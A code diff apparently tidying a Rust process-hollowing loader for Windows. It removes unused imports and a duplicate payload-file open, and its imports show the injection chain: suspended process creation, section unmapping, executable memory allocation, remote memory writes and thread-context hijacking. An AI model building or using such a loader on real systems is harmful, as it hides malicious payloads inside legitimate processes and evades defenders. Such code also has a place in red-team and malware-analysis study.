@@ -1,24 +1,12 @@
-use std::{
-    ffi::CString,
-    fs::{self, File},
-    io::Read,
-    mem::zeroed,
-    ops::Add,
-    ptr::null_mut,
-    str::from_utf8,
-};
+use std::{ffi::CString, fs::File, io::Read, mem::zeroed, ptr::null_mut};
 
 use windows_sys::{
-    Wdk::System::{
-        Memory::{NtUnmapViewOfSection, ZwUnmapViewOfSection},
-        Threading::{NtQueryInformationProcess, ProcessWin32kSyscallFilterInformation},
-    },
+    Wdk::System::{Memory::NtUnmapViewOfSection, Threading::NtQueryInformationProcess},
     Win32::System::{
         Diagnostics::Debug::{
-            CONTEXT, CONTEXT_CONTROL_AMD64, CONTEXT_FULL_AMD64, CONTEXT_INTEGER_AMD64,
-            GetThreadContext, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_FILE_HEADER,
-            IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, ReadProcessMemory, SetThreadContext,
-            WriteProcessMemory,
+            CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, IMAGE_DIRECTORY_ENTRY_BASERELOC,
+            IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, ReadProcessMemory,
+            SetThreadContext, WriteProcessMemory,
         },
         Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
         SystemServices::{
@@ -26,8 +14,8 @@ use windows_sys::{
             IMAGE_REL_BASED_DIR64,
         },
         Threading::{
-            CREATE_SUSPENDED, CreateProcessA, PEB, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
-            ResumeThread, STARTUPINFOA, WaitForSingleObject,
+            CREATE_SUSPENDED, CreateProcessA, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
+            ResumeThread, STARTUPINFOA,
         },
     },
 };
@@ -49,14 +37,6 @@ fn main() {
         );
         return;
     }
-
-    let mut fd = match File::open(args.get(2).unwrap()) {
-        Ok(file) => file,
-        Err(e) => {
-            println!("[-] Failed to open payload file: {}", e);
-            return;
-        }
-    };
 
     let mut buffer = Vec::new();
     if let Err(e) = File::open(&args[2]).and_then(|mut f| f.read_to_end(&mut buffer)) {
